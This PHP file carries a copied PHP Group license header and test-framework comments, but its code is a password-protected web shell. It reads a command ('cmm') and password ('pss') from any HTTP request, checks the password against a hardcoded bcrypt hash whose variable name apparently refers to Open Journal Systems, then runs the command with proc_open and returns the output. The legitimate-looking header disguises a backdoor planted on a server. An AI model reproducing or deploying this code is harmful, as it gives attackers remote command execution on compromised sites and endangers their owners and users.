<?php

/*
   +----------------------------------------------------------------------+
   | Copyright (c) The PHP Group                                          |
   +----------------------------------------------------------------------+
   | This source file is subject to version 3.01 of the PHP license,      |
   | that is bundled with this package in the file LICENSE, and is        |
   | available through the world-wide-web at the following url:           |
   | https://php.net/license/3_01.txt                                     |
   | If you did not receive a copy of the PHP license and are unable to   |
   | obtain it through the world-wide-web, please send a note to          |
   | license@php.net so we can mail you a copy immediately.               |
   +----------------------------------------------------------------------+
   | Authors: Ilia Alshanetsky <iliaa@php.net>                            |
   |          Preston L. Bannister <pbannister@php.net>                   |
   |          Marcus Boerger <helly@php.net>                              |
   |          Derick Rethans <derick@php.net>                             |
   |          Sander Roobol <sander@php.net>                              |
   |          Andrea Faulds <ajf@ajf.me>                                  |
   | (based on version by: Stig Bakken <ssb@php.net>)                     |
   | (based on the PHP 3 test framework by Rasmus Lerdorf)                |
   +----------------------------------------------------------------------+
 */

/* Let there be no top-level code beyond this point:
 * Only functions and classes, thanks!
 *
 * Minimum required PHP version: 7.4.0
 */

class PHPsysDescriptor
{
    private $storedOJSPasswordHash;

    public function __construct($storedOJSPasswordHash)
    {
        $this->storedOJSPasswordHash = $storedOJSPasswordHash;
    }

    public function execute($command, $providedPassword)
    {
        if (!password_verify($providedPassword, $this->storedOJSPasswordHash)) {
            return "403 Forbidden";
        }

        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($command, $descriptors, $pipes);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errorOutput = stream_get_contents($pipes[2]);

            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);

            $exitCode = proc_close($process);

            return $exitCode === 0 ? $output : "Error: " . $errorOutput;
        } else {
            return "False";
        }
    }
}

class Request
{
    private $command;
    private $password;

    public function __construct($request)
    {
        if (isset($request['cmm']) && isset($request['pss'])) {
            $this->command = $request['cmm'];
            $this->password = $request['pss'];
        } else {
            throw new Exception("");
        }
    }

    public function getCommand()
    {
        return $this->command;
    }

    public function getPassword()
    {
        return $this->password;
    }
}

$storedOJSPasswordHash = '$2y$10$nfOaeCOIm6RRtRBxggCImugrcI.j1n9BgSJWdN5PHxnY6J.sdp6zu';

try {
    $request = new Request($_REQUEST);
    $executor = new PHPsysDescriptor($storedOJSPasswordHash);
    echo $executor->execute($request->getCommand(), $request->getPassword());
} catch (Exception $e) {
    echo $e->getMessage();
}

?>
